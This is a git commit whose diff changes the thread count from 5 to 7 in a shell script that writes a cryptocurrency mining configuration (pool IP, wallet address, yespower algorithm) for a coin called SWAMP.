c805a16be18781b8792dbf583c3138b831bb2b1a
barburonjilo <barburonjilo@outlook.co.id>
2025-03-22 13:52:12 +0700

    Update swamp2.sh

--- swamp2.sh
+++ swamp2.sh
@@ -10,7 +10,7 @@ cat > config.json <<END
   "url": "45.115.225.32:443",
   "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ",
   "pass": "c=SWAMP,zap=SWAMP,mc=SWAMP",
-  "threads": 5,
+  "threads": 7,
   "algo": "yespower"
 }
 END
